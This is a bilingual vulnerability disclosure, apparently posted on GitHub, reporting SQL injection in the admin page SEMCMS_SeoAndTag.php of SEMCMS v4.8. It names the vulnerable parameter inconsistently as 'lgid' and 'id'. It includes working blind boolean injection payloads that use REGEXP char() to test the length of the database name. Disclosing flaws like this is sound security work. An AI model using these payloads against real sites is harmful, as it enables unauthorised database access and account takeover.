# Seecms
# sql注入漏洞

### BUG_Author: Megrez

### Affected version: Seecms

### Vendor: https://www.sem-cms.com/

### Software: https://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip

![image](https://github.com/user-attachments/assets/b989312d-f06c-416e-83b5-04b2d98e12a9)


### Vulnerability File:

/xcR45q_Admin/SEMCMS_SeoAndTag.php

### Description:

seecms系统v4.8存在SQL注入漏洞在SEMCMS_SeoAndTag.php页面。
 参数lgid没有被正确处理。黑客可以利用这个漏洞来操纵系统的管理员账户，并可以完全控制其他账户的信息。
 状态：严重



The system seecmsv4.8 is vulnerable to SQL Injection via /xcR45q_Admin/SEMCMS_SeoAndTag.php.
 The parameter `lgid` is not sanitized correctly. The malicious actor can use this  vulnerability to manipulate the administrator account of the systemand  can take full control of the information about the other accounts.
 Status: CRITICAL

GET parameter ‘id’ exists SQL injection vulnerability



Payload: -1%20or%20length(database())%20REGEXP%20char(94,53,36)

（判断数据库名长度是否为5）插入payload看回显

![image](https://github.com/user-attachments/assets/e0e49908-3857-4380-83a2-ad1c487bbb81)




此时更改payload

-1%20or%20length(database())%20REGEXP%20char(94,54,36)

（判断数据库名长度是否为6） 

插入payload查看回显 

![image](https://github.com/user-attachments/assets/1a29adad-cebb-4ec5-9699-ef59d71cfc58)
